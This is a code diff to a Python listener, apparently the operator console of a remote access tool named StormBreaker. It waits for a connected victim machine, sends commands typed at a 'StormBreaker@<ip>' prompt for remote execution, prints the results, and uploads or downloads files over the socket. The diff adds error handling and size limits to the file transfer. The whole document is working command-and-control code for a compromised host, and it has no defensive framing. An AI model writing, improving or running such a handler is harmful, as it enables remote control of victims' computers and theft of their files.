@@ -2,20 +2,38 @@ import socket
 import os
 
 
-def upload_file(conn, file_name):
-	with open(file_name, 'rb')as f:
-	    data = f.read(1024)
-	    while data:
-	        s.send(data)
-	        data = f.read(1024)
+def upload_file(s, filename):
+    try:
+        size = os.stat(filename).st_size
+        if int(size) < 10000000:
+            with open(filename, "rb") as f:
+                data = f.read()
+                s.sendall(data)
+                print("[+] File Uploaded Succesfully!")
+        else:
+            s.sendall("ERROR")
+            print("TOO LARGE")
+    except FileNotFoundError:
+        s.sendall("ERROR")
+        print("[-] File not Found!")
+    except:
+        s.sendall("ERROR")
+        print("[-] Something went wrong!")
 
 
-def download_file(conn, file_name):
-    with open(file_name, "wb") as f:
-        raw_data = conn.recv(1024)
-        while raw_data:
-            f.write(raw_data)
-            raw_data = conn.recv(1024)
+def download_file(s, filename):
+    file_bytes = s.recv(10000000)
+    try:
+        if file_bytes.decode() == "ERROR":
+            print("[-] An Error Occurred!\n  Check the file name or the file is too large to download.")
+            return
+    except:
+        print("[-] An Error Occurred!\n  Check the file name or the file is too large to download.")
+        return
+
+    print("[*] Downloading File...")
+    with open(filename, "wb") as f:
+        f.write(file_bytes)
     print("[+] Download Finished!")
 
 
@@ -34,24 +52,27 @@ def listener():
         print(f"\n      [+] Connected to {addr[0]}\n")
 
         while True:
-            command = input(f"<<StormBreaker@{addr[0]}>> ")
-            if command != "":
-                if command == 'clear':
-                    os.system('clear')
-                elif command[:8] == 'download':
-                    conn.send(f"download {command[9:]}".encode())
-                    print("[*] Downloading File...")
-                    download_file(conn, command[9:])
-                elif command[:6] == 'upload':
-                    conn.send(f"upload {command[7:]}".encode())
-                    upload_file(conn, command[7:])
-                elif command != "quit":
-                    conn.send(command.encode())
-                    recieved_data = conn.recv(5000).decode()
-                    print(recieved_data)
+            try:
+                command = input(f"<<StormBreaker@{addr[0]}>> ")
+                if command != "":
+                    if command == 'clear':
+                        os.system('clear')
+                    elif command[:8] == 'download':
+                        conn.send(command.encode())
+                        download_file(conn, command[9:])
+                    elif command[:6] == 'upload':
+                        conn.send(f"upload {command[7:]}".encode())
+                        upload_file(conn, command[7:])
+                    elif command != "quit":
+                        conn.send(command.encode())
+                        recieved_data = conn.recv(5000).decode()
+                        print(recieved_data)
+                    else:
+                        conn.close()
+                        print("\n[-] Connection Closed!\n")
+                        break
                 else:
-                    conn.close()
-                    print("\n[-] Connection Closed!\n")
-                    break
-            else:
-                pass
+                    pass
+            except KeyboardInterrupt:
+                conn.close()
+                break
